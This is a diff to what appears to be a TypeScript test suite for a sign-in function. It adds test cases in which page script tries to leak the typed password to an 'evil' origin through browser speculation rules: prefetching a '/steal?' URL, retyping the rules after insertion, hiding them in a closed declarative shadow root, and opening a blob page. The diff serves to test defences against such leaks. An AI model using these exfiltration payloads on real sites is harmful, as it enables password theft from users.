@@ -547,6 +547,9 @@ describe(signIn, () => {
     /** A script element of rules that prefetch and prerender an address on `origin` carrying `pw`. */
     const speculationRules = (origin: string): string =>
         `Object.assign(document.createElement("script"), { textContent: JSON.stringify({ prefetch: [{ source: "list", urls: ["${origin}/steal?" + pw] }], prerender: [{ source: "list", urls: ["${origin}/render?" + pw] }] }), type: "speculationrules" })`;
+    /** Markup, as a script expression, of a closed declarative shadow root holding rules that prefetch every link, and a link on `origin` carrying `pw`. */
+    const closedRules = (origin: string): string =>
+        `'<div><template shadowrootmode="closed"><script type="speculationrules">${EVERY_LINK}</' + 'script></template></div><a href="${origin}/steal?' + encodeURIComponent(pw) + '">x</a>'`;
     const blobWorker = (realm: string): string =>
         `new ${realm}.Worker(${realm}.URL.createObjectURL(new ${realm}.Blob([${JSON.stringify(`${exfiltrate()} onmessage = (event) => send(event.data);`)}]))).postMessage(pw);`;
 
@@ -686,6 +689,24 @@ describe(signIn, () => {
             "speculation rules a script adds",
             () => {
                 return { page: onSubmit(`document.head.append(${speculationRules(evil.origin)});`) };
+            },
+        ],
+        [
+            "speculation rules whose type a script changes once they are in",
+            () => {
+                return { page: onSubmit(`const rules = ${speculationRules(evil.origin)}; document.head.append(rules); rules.type = "text/plain";`) };
+            },
+        ],
+        [
+            "speculation rules a script writes into the parsed page in a declarative shadow root",
+            () => {
+                return { page: onSubmit(`document.open(); document.write(${closedRules(evil.origin)}); document.close();`) };
+            },
+        ],
+        [
+            "a page of its own markup it opens in the tab, with speculation rules in a declarative shadow root",
+            () => {
+                return { page: onSubmit(`location.href = URL.createObjectURL(new Blob([${closedRules(evil.origin)}], { type: "text/html" }));`) };
             },
         ],
         [
